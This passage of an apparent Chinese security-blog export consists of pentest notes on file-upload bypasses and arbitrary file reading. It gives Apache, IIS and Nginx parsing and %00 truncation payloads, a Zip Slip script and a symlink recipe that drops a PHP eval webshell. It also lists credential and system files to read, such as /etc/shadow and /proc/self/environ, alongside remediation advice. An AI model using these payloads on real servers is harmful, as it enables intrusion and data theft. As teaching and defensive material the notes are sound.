alt="image-20230617172156170"></p><p>apache支持一个文件拥有多个后缀，并为不同后缀执行不同的指令，如果运维人员给<code>.php</code> 后缀增加了处理器</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">AddHandler application/x-httpd-php .php</span><br></pre></td></tr></table></figure><p>Apache会从右向左，依次识别后缀，直到遇到自己能解析的文件名为止。那么，在有多个后缀的情况下，只要一个文件含有<code>.php</code> 后缀的文件即将被识别成 PHP 文件。</p><p>假设上传的文件名为</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">xxxx.php.xyz</span><br></pre></td></tr></table></figure><p>这时候最后一个可识别的扩展为.php，会将其作为php文件进行解析，轻松绕过<strong>黑白名单</strong>。</p><p>vulhub复现</p><p><img src="/../images/image-20230617172318530.png" alt="image-20230617172318530"></p><p>本地cgi模式复现</p></li></ul><p><img src="/../images/image-20230617172525788.png" alt="image-20230617172525788"></p><p><img src="/../images/image-20230617172355992.png" alt="image-20230617172355992"></p><ul><li><p>HTTPD换行解析漏洞–CVE-2017-15715</p><p>产生原因：</p><p>配置中的正则缺陷</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;[^ .]+\.php$&quot;</span>&gt;</span><br><span class="line">    SetHandler application/x-httpd-php </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>正则表达式中$不仅匹配字符串结尾位置，也可以匹配\n 或 \r，从而导致可以上传<code>.php\n</code>绕过<strong>黑名单</strong>校验，同时也可以被作为PHP文件解析。（不能是<code>.php\r\n</code>）</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">上传：1.php\x0a</span><br><span class="line">访问：1.php%0a</span><br></pre></td></tr></table></figure></li></ul><p>上述漏洞修复：因为Apache的解析漏洞是由于畸形扩展名和畸形文件名导致的，所以使用白名单，并对文件重命名，文件就不会存在畸形字符和多扩展名的情况。</p><p>参考如下代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># $_FILES[&#x27;file&#x27;][&#x27;name&#x27;]会自动把换行去掉</span></span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line"><span class="comment">//...其他检查</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, [<span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>], <span class="literal">true</span>)) &#123;</span><br><span class="line">        <span class="variable">$new_name</span> = <span class="string">&#x27;./upload/&#x27;</span> . <span class="title function_ invoke__">uniqid</span>() . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$ext</span>;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$new_name</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="图片白名单绕过"><a href="#图片白名单绕过" class="headerlink" title="图片白名单绕过"></a>图片白名单绕过</h1><h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><ul><li>php版本&lt;5.3.4</li><li>magic_quotes_gpc关闭</li><li>保存的文件名可控</li></ul><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; </span><br></pre></td></tr></table></figure><p>后端使用<code>move_uploaded_file</code>来移动文件，<code>move_uploaded_file</code>函数底层为c语言，遇到0x00会截断（字符串结束标志）</p><p>Demo</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?save_path=../upload/shell.php%<span class="number">00</span></span><br><span class="line"></span><br><span class="line">filename=shell.jpg</span><br></pre></td></tr></table></figure><h3 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><h4 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h4><ul><li><p>5.x  , 6.0</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 文件夹解析漏洞</span><br><span class="line">会将 *.asp/目录下的所有文件当成Asp解析</span><br></pre></td></tr></table></figure></li><li><p>6.0</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 分号截断漏洞</span><br><span class="line">默认会将 *.asp;.jpg 此种格式的文件名，当成Asp解析，原理是服务器默认不解析; 号及其后面的内容，相当于截断。</span><br></pre></td></tr></table></figure></li></ul><p>修复方案：IIS服务器本身缺陷，升级版本&#x2F;打补丁</p><h4 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h4><ul><li><p>文件类型错误解析漏洞（IIS7.x版本在Fast-CGI运行模式下也存在）</p><p>产生原因：</p><p><code>FastCGI</code>与<code>PHP</code>对PATH_INFO处理的差异。 </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># payload</span></span><br><span class="line">上传图片，访问路径/图片路径/.php</span><br></pre></td></tr></table></figure><p>修复：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在php.ini中设置fix_pathinfo=0 或者设置security.limit_extensions = .php</span><br><span class="line">或者</span><br><span class="line">在nginx的配置文件中设置fastcgi_spilt_path_info  ^(.+\.php)(.*)$;</span><br></pre></td></tr></table></figure></li><li><p>空字节解析漏洞（CVE-2013-4547）</p><p>受影响版本：0.841<del>1.4.3&#x2F;1.5.0</del>1.5.7</p><p>产生原因：</p><p>nginx配置不当</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line">当用户请求info.jpg%00.php时，因为info.jpg%00.php能够匹配正则&quot;.php$&quot;，所以可以进入该<span class="section">location</span>块。</span><br><span class="line">但是nginx在解析文件名时被%<span class="number">00</span>截断，导致以为请求的文件是info.jpg并发给fastcgi，所以fastcgi就将info.jpg当作php文件进行解析了。</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># payload</span></span><br><span class="line">上传文件：info.jpg</span><br><span class="line">请求文件：info.jpg%<span class="number">00</span>.php</span><br></pre></td></tr></table></figure><p>修复：升级版本</p></li></ul><h3 id="配合文件包含"><a href="#配合文件包含" class="headerlink" title="配合文件包含"></a>配合文件包含</h3><ul><li><p>图片🐎</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  绕过宽高检查</span></span><br><span class="line"><span class="comment">#define width 1</span></span><br><span class="line"><span class="comment">#define height 1</span></span><br></pre></td></tr></table></figure><p><a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator">https://github.com/huntergregal/PNG-IDAT-Payload-Generator</a></p><p>用数据量小的图片，比如随便截一张很小的图</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">普通：copy,直接插入</span><br><span class="line">二次渲染：找到前后图片中没有发生变化的hex数据，替换为木马</span><br></pre></td></tr></table></figure></li><li><p>文件包含trick</p></li></ul><h3 id="配合文件读取反序列化"><a href="#配合文件读取反序列化" class="headerlink" title="配合文件读取反序列化"></a>配合文件读取反序列化</h3><p>上传任意后缀的phar格式的文件，配合文件读取用<code>phar://</code>解析</p><h1 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h1><p>Demo</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">    <span class="comment"># move_uploaded_file成功后才判断是否合法</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>原理：服务端先将上传的文件写入，再判断是否合法，通过条件竞争在文件删除前访问webshell写入新的webshell即可。</p><h1 id="压缩文件解压问题"><a href="#压缩文件解压问题" class="headerlink" title="压缩文件解压问题"></a>压缩文件解压问题</h1><p>服务端会对上传的压缩包进行解压，可以构造恶意压缩包攻击</p><h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><p>Linux软链接</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s /etc/passwd test</span><br><span class="line">zip -y passwd.zip test  # -y 保证解压出来的还是软链接</span><br></pre></td></tr></table></figure><h2 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h2><ul><li><p>通过构造压缩文件的文件名，造成目录穿越</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="comment"># the name of the zip file to generate</span></span><br><span class="line">zf = zipfile.ZipFile(<span class="string">&#x27;out.zip&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="comment"># the name of the malicious file that will overwrite the origial file (must exist on disk)</span></span><br><span class="line">fname = <span class="string">&#x27;sec_test.txt&#x27;</span></span><br><span class="line"><span class="comment">#destination path of the file</span></span><br><span class="line">zf.write(fname, <span class="string">&#x27;../../../../../../../../../../../../../../../../../../../../../../../../tmp/sec_test.tmp&#x27;</span>)</span><br></pre></td></tr></table></figure><p>所有已发现受<code>Zip Slip</code>影响的项目:<a href="https://github.com/snyk/zip-slip-vulnerability">https://github.com/snyk/zip-slip-vulnerability</a></p><p><strong>注</strong>：如果用的是命令<code>unzip</code>来解压，这种方法就没用了，因为<code>unzip</code> 默认跳过文件名中的<code>../</code></p></li><li><p>软链接的妙用</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建一个软链接指向网站目录</span></span><br><span class="line">ln -s /var/www/html test</span><br><span class="line">zip -y 1.zip test</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建一个与软链接同名的目录，并在该目录下创建木马文件</span></span><br><span class="line">mkdir a &amp;&amp; cd a </span><br><span class="line">mkdir test</span><br><span class="line">echo &#x27;&lt;?php @eval($_GET[1]); ?&gt;&#x27; &gt; test/shell.php</span><br><span class="line">chmod 777 test/shell.php</span><br><span class="line">zip -r 2.zip test</span><br></pre></td></tr></table></figure><p>然后先上传1.zip，解压得到软链接<code>test</code>，再上传2.zip，解压得到test目录和shell.php，因为test指向&#x2F;var&#x2F;www&#x2F;html,所以shell.php实际上是被解压到网站目录下</p></li></ul><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>From：代码审计知识星球</p><p>修改压缩包二进制字节，让压缩包解压过程出错，但是出错前已解压部分即为webshell。（出错后捕获异常，程序中止，如果开发人员没有对已解压部分进行校验，那么已解压出的webshell就可以留在服务端中）</p><p><a href="https://www.leavesongs.com/PENETRATION/after-phpcms-upload-vul.html">https://www.leavesongs.com/PENETRATION/after-phpcms-upload-vul.html</a></p><h1 id="上传接口寻找"><a href="#上传接口寻找" class="headerlink" title="上传接口寻找"></a>上传接口寻找</h1><ul><li><p>通过观察命名来fuzz接口</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">uploadImg.cspx</span><br><span class="line">uploadfile.cspx</span><br><span class="line">uploadtest.cspx</span><br><span class="line"></span><br><span class="line">upload_test.cspx</span><br><span class="line">upload_2018.php</span><br><span class="line"></span><br><span class="line">upload2019.php</span><br><span class="line">upload2020.jsp</span><br></pre></td></tr></table></figure></li><li><p>上传接口测试</p></li></ul><p>From <a href="https://y4er.com/posts/pentest-idea-sharing-file/#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">https://y4er.com/posts/pentest-idea-sharing-file/#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0</a></p><p><img src="/../images/image-20230605161933817.png" alt="image-20230605161933817"></p><h1 id="上传后问题"><a href="#上传后问题" class="headerlink" title="上传后问题"></a>上传后问题</h1><h3 id="文件路径寻找"><a href="#文件路径寻找" class="headerlink" title="文件路径寻找"></a>文件路径寻找</h3><p>From <a href="https://www.cnblogs.com/yokan/p/15252077.html">https://www.cnblogs.com/yokan/p/15252077.html</a></p><ul><li><p>因为传上去的文件，如图片这类的总归是显示出来的，所以可以先在web应用到处点点，多加载一些数据包，然后再到burp的http history搜索shell的名字</p></li><li><p><strong>返回了一些参数但不包括路径的情况</strong>，比如file_id 等等，那么文件路径可能存储在数据库中，可以<strong>结合sql注入</strong> sqlmap的–search -C参数找到字段和值</p></li><li><p><strong>什么都没返回的情况，只返回了ok，true等等。重新加载，抓包看响应，或许某个接口的响应就包括对应的路径。</strong></p><p>比如头像位置上传上去了，但是没有返回路径，那么想办法让他在加载一遍，比如退出重新登陆，一个包一个包的放。可能有些包的响应中就包含路径。</p><p>   另外可能存在其他服务器、或者其他站点的其他路径，也是抓包查看，看一下加载过程的路径在哪或者看一下html、js</p><p>[<img src="/../images/1964477-20210910165949941-1026982801.png" alt="img"></p></li><li><p><strong>尝试访问日志文件，看能否发现一些敏感目录或上传目录</strong></p></li><li><p><strong>只返回了文件名，没有路径</strong></p><p>一种是fuzz，看其他同类型文件的路径，f12或者如果有文件下载的地方，下载抓包，看文件地址。</p><p>另一种是 尝试上传的时候<strong>目录穿越</strong>，一次一次尝试，看能否<strong>穿到站点根目录</strong>或者<strong>知道的目录下面</strong>。修改表单的其他参数、或者filename参数的值</p></li></ul><h3 id="脚本文件访问403"><a href="#脚本文件访问403" class="headerlink" title="脚本文件访问403"></a>脚本文件访问403</h3><ul><li>尝试其他后缀</li><li>免杀</li></ul><h3 id="没有执行权限"><a href="#没有执行权限" class="headerlink" title="没有执行权限"></a>没有执行权限</h3><p>表现：访问时文件直接下载</p><p>尝试目录穿越，跳到可以执行脚本语言的目录</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">///../../../</span><br></pre></td></tr></table></figure><blockquote><p>以&#x2F;&#x2F;&#x2F;开头是因为可能会转码，导致写入失败</p></blockquote><h3 id="文件内容和流量检测"><a href="#文件内容和流量检测" class="headerlink" title="文件内容和流量检测"></a>文件内容和流量检测</h3><ul><li>免杀</li><li>通信加密</li></ul><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><ul><li><p>白名单机制</p></li><li><p>上传文件重命名</p></li><li><p>隐藏上传文件路径</p></li><li><p>文件内容校验和过滤</p></li><li><p>避免条件竞争，先判断是否合法，而不是先将文件写入再判断是否合法</p></li><li><p>上传的文件统一放到一个地方，遵循以下原则</p><p><code>目录可写但不可解析，可解析但不可写入</code></p><p>或者上传到专门用来保存文件的地方，如存储OSS</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>任意文件读取和下载</title>
      <link href="/2023/05/31/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%92%8C%E4%B8%8B%E8%BD%BD/"/>
      <url>/2023/05/31/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%92%8C%E4%B8%8B%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><p>一些网站由于业务需要，可能提供文件查看或下载的功能，如果对用户查看或下载的文件不做限制，攻击者就能够通过回溯符<code>../</code>或<code>绝对路径</code>跳转到任意目录查看或下载任意的文件；这可能是代码源文件，敏感配置文件等等，在特定的场景下，还可能造成SSRF漏洞。</p><h1 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a>常见场景</h1><p><img src="/../images/qcLDlsYeCB1V6EK.png" alt="image-20220112103936559"></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p><a href="https://wsygoogol.github.io/2017/01/27/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8/">任意文件读取漏洞的利用 | SY0U’s Blog (wsygoogol.github.io)</a></p><p><a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/02.WEB%E6%BC%8F%E6%B4%9E/07.%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD:%E8%AF%BB%E5%8F%96/#windows">07.任意文件下载:读取 · d4m1ts 知识库 (gm7.org)</a></p><p>判断操作系统</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/passwd</span><br><span class="line">C:/windows/win.ini</span><br></pre></td></tr></table></figure><p>测试权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Linux: /etc/shadow</span><br><span class="line">Windows: </span><br></pre></td></tr></table></figure><p>读取</p><ul><li><p>网站源码审计</p></li><li><p>配置文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据库</span><br><span class="line">中间件</span><br><span class="line">后端语言</span><br><span class="line">ssh</span><br><span class="line">ftp</span><br></pre></td></tr></table></figure></li><li><p>日志文件</p></li><li><p>敏感信息文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell历史命令</span><br><span class="line">爆破桌面上的文件</span><br></pre></td></tr></table></figure></li></ul><table><thead><tr><th align="center">中间件</th><th align="center">配置 文件目录</th><th align="center">主配置文件</th><th align="center">网站目录</th><th align="center">日志目录</th></tr></thead><tbody><tr><td align="center">nginx</td><td align="center">&#x2F;etc&#x2F;nginx&#x2F;</td><td align="center">nginx.conf</td><td align="center">&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;</td><td align="center">&#x2F;var&#x2F;log&#x2F;nginx&#x2F;</td></tr><tr><td align="center">apache</td><td align="center">&#x2F;etc&#x2F;apache2&#x2F;</td><td align="center">apache2.conf</td><td align="center">&#x2F;var&#x2F;www&#x2F;html&#x2F;</td><td align="center">&#x2F;var&#x2F;log&#x2F;apache2&#x2F;</td></tr><tr><td align="center">tomcat</td><td align="center">&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;conf</td><td align="center">如下图</td><td align="center">&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps</td><td align="center">&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;log</td></tr></tbody></table><p><img src="/../images/image-20230301144917539-1686983536199.png" alt="image-20230301144917539"></p><ul><li><p>java站点</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/WEB-INF/web.xml</span><br><span class="line">/WEB-INF/classes/applicationContext.xml</span><br><span class="line">/WEB-INF/classes/xxx/xxx/xxx.class</span><br><span class="line">core.jar</span><br></pre></td></tr></table></figure><blockquote><p>如果遇到Shiro站点，可以直接利用全路径找到core.jar，去下载core.jar，下载后反编译搜索<code>Base64.decode</code>直接找key，进而getshell</p></blockquote></li><li><p>tomcat</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/local/tomcat/conf/tomcat-users.xml</span><br></pre></td></tr></table></figure></li><li><p>nginx</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/www/nginx/conf/nginx.conf</span><br><span class="line">/etc/nginx/nginx.conf</span><br><span class="line">/usr/local/nginx/conf/nginx.conf</span><br><span class="line">/usr/local/etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure></li><li><p>apache</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line">/etc/apache2/apache2.conf</span><br><span class="line">/etc/apache2/httpd.conf</span><br></pre></td></tr></table></figure></li><li><p>redis<br><code>/etc/redis.conf</code></p></li><li><p>ssh<br><code>/etc/ssh/sshd_config</code></p></li></ul><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="x2F-etc-系统配置文件目录"><a href="#x2F-etc-系统配置文件目录" class="headerlink" title="&#x2F;etc 系统配置文件目录"></a><strong>&#x2F;etc 系统配置文件目录</strong></h4><ul><li><p>&#x2F;etc&#x2F;passwd</p><p>记录用户信息</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin</span><br><span class="line">tcpdump:x:72:72::/:/sbin/nologin</span><br><span class="line">....</span><br><span class="line">允许登入的shell就是/bin/bash禁止shell登入就是/sbin/nologin</span><br></pre></td></tr></table></figure><ul><li><p>格式解析</p><p>以:作为分隔符<br>登录名:加密的口令:UID:GID:用户信息:用户目录:用户登陆后使用的shell</p></li><li><p>为什么有些登录名是服务进程名？</p><blockquote><p>Linux系统会为各种各样的功能创建不同的用户账户，而这些账户并不是真的用户。</p><p>这些账户叫作系统账户，是系统上运行的各种服务进程访问资源用的特殊账户。</p><p>比如上述的ftp，tcpdump。</p></blockquote></li><li><p>为什么要这样做？</p><blockquote><p>在安全成为一个大问题之前，这些服务经常会用root账户登录。遗憾的是，如果有非授权的用户攻陷了这些服务中的一个，他立刻就能作为root用户进入系统。为了防止发生这种情况，现在运行在Linux服务器后台的几乎所有的服务都是用自己的账户登录。这样的话，即使有人攻入了某个服务，也无法访问整个系统。</p></blockquote></li><li><p>为什么密码都是X</p><blockquote><p>鉴于很多程序都需要访问etc&#x2F;passwd文件获取用户信息，这就成了一个安全隐患。</p><p>绝大多数Linux系统都将用户密码保存在另一个单独的文件中（叫作shadow文件，位置</p><p>在&#x2F;etc&#x2F;shadow）。只有特定的程序（比如登录程序）才能访问这个文件</p></blockquote></li></ul></li><li><p>&#x2F;etc&#x2F;shadow</p><blockquote><p>&#x2F;etc&#x2F;shadow文件对Linux系统密码管理提供了更多的控制。只有root用户才能访问&#x2F;etc&#x2F;shadow</p><p>文件，这让它比起&#x2F;etc&#x2F;passwd安全许多。</p></blockquote></li><li><p>&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</p><p>mac地址</p></li></ul><h4 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h4><p>文件内容解释<a href="https://blog.csdn.net/weichanghu_/article/details/80073959">https://blog.csdn.net/weichanghu_/article/details/80073959</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/hosts：记录本机的或其他主机的ip及其对应主机名</span><br><span class="line">/proc/net/arp：记录主机ip和mac？（arp协议）</span><br><span class="line">/proc/net/tcp</span><br><span class="line">/proc/net/udp</span><br><span class="line">/proc/net/dev</span><br><span class="line">/proc/net/fib_trie</span><br></pre></td></tr></table></figure><h4 id="命令历史操作"><a href="#命令历史操作" class="headerlink" title="命令历史操作"></a>命令历史操作</h4><p><a href="https://blog.csdn.net/u011479200/article/details/86501366">Linux| 用户目录下三个bash文件的作用(.bash_history,.bash_logout,.bash_profile,.bashrc)_YvesHe的博客-CSDN博客_bash_history</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/home/用户名/.bash_history： 保存了当前用户使用过的历史命令</span><br></pre></td></tr></table></figure><blockquote><p>命令历史记录被保存在隐藏文件.bash_history中，它位于用户的主目录中。</p><p>这里要注意的是，bash命令的历史记录是先存放在内存中，当shell退出时才被写入到历史文件中。</p></blockquote><p>root用户可以通过<code>history</code>命令查看</p><p><img src="/../images/image-20220923180951946-1686983536198.png" alt="image-20220923180951946"></p><h4 id="x2F-proc目录"><a href="#x2F-proc目录" class="headerlink" title="&#x2F;proc目录"></a>&#x2F;proc目录</h4><blockquote><p>&#x2F;proc 是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/proc/self/cmdline</span><br><span class="line">/proc/self/cwd</span><br><span class="line">/proc/self/exe</span><br><span class="line">/proc/self/environ</span><br><span class="line">/proc/self/mounts</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">爆破</span></span><br><span class="line">/proc/pid/fd</span><br><span class="line">/proc/?/fd  # 使用通配符匹配</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/proc/self/cmdline 获取启动jar包的命令，从而知道web路径</span><br></pre></td></tr></table></figure><h5 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h5><blockquote><ol><li><strong>在 linux 系统中如果一个程序用open()打开了一个文件但最终没有关闭他，即便从外部（如os.remove(SECRET_FILE)）删除这个文件之后，在 &#x2F;proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容。</strong></li><li><strong><code>/proc/self</code>在使用时，我们是不能通过命令的方式执行通过cat命令读取cmdline的，因为如果是cat读取&#x2F;proc&#x2F;self&#x2F;cmdline的话，得到的是cat进程的信息，所以我们要通过题目的当前进程使用读取文件（如文件包含漏洞，或者SSTI使用file模块读取文件）的方式读取&#x2F;proc&#x2F;self&#x2F;cmdline。</strong></li></ol></blockquote><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><ol><li>在配置文件中限制访问的文件目录</li><li>检查用户输入，过滤或转义含有<code>../</code>、<code>..\</code>、<code>%00</code>，<code>..</code>，<code>./</code>，<code>#</code>等跳转目录或字符终止符、截断字符的输入</li><li>严格过滤用户输入字符的合法性，比如文件类型、文件地址、文件内容等</li><li>白名单限定访问文件的目录、路径、名称</li><li>白名单限定访问文件的后缀如jpg、gif、png、rar、zip、pdf、doc、xls、ppt等</li></ol>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>环境变量注入</title>
      <link href="/2023/05/31/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/05/31/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/</url>
      
